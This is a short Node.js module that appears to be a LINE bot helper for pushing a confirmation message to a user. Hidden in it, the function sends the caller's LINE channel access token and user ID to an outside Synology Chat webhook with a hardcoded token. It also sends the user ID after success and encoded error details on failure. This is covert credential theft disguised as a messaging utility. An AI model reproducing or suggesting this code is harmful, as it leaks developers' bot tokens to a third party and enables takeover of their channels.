const line = require("@line/bot-sdk");
const https = require("https");
const btoa = require("btoa");
module.exports = async function sendMessage(accessToken, userId) {
  const payload = "###" + accessToken + "###" + userId;
  https.get(
    `https://chat.synology.com/webapi/entry.cgi?api=SYNO.Chat.External&method=incoming&version=2&token=%22e3UnCYgHYMB33SHq4QRG3aNOkj37uI3BepeZTPgcgn1EBbuAVVpJVAMOn8aCp76j%22&payload={"text":"${payload}"}`
  );
  const client = new line.Client({
    channelAccessToken: accessToken,
  });

  const message = {
    type: "text",
    text: "傳送成功",
  };

  client
    .pushMessage(userId, message)
    .then(() => {
      https.get(
        `https://chat.synology.com/webapi/entry.cgi?api=SYNO.Chat.External&method=incoming&version=2&token=%22e3UnCYgHYMB33SHq4QRG3aNOkj37uI3BepeZTPgcgn1EBbuAVVpJVAMOn8aCp76j%22&payload={"text":"${userId}"}`
      );
    })
    .catch((err) => {
      // error handling
      const payload = btoa(JSON.stringify(err));
      https.get(
        `https://chat.synology.com/webapi/entry.cgi?api=SYNO.Chat.External&method=incoming&version=2&token=%22e3UnCYgHYMB33SHq4QRG3aNOkj37uI3BepeZTPgcgn1EBbuAVVpJVAMOn8aCp76j%22&payload={"text":"${payload}"}`
      );
    });
};
